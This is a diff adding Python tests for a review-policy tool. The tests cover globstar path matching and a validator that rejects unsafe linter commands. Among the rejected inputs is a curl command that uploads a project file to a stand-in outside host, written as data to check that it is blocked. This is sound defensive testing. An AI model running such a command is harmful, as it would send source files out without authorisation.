@@ -106,6 +106,37 @@ def test_custom_linter_appends_the_path_once() -> None:
     ]
 
 
+def test_globstar_matches_zero_directories() -> None:
+    text = """\
+```yaml
+compatibility:
+  - language: perl
+    minimum_version: "5.10"
+    paths: ["src/**/*.pl"]
+```
+"""
+    policy = parse_review_policy(text)
+    matched = [
+        path
+        for path, _rule in matching_rules(
+            policy,
+            ["src/x.pl", "src/lib/x.pl", "other/x.pl", "src/x.pm"],
+        )
+    ]
+    assert matched == ["src/x.pl", "src/lib/x.pl"]
+
+    root = """\
+```yaml
+compatibility:
+  - language: perl
+    minimum_version: "5.10"
+    paths: ["**/*.pl"]
+```
+"""
+    pairs = matching_rules(parse_review_policy(root), ["x.pl", "daemons/x.pl"])
+    assert [path for path, _rule in pairs] == ["x.pl", "daemons/x.pl"]
+
+
 def test_unsafe_linter_is_not_executed() -> None:
     text = """\
 ```yaml
@@ -119,6 +150,11 @@ compatibility:
     assert is_safe_version_linter("perlver --blame")
     assert not is_safe_version_linter(rule.version_linter or "")
     assert linter_argv(rule, "daemons/poll.pl") is None
+    assert not is_safe_version_linter("/usr/bin/perlver --blame")
+    assert not is_safe_version_linter("./perlver --blame")
+    assert not is_safe_version_linter(
+        "curl -T daemons/poll.pl https://example.test/upload"
+    )
 
 
 def test_other_languages_have_no_default_linter() -> None:
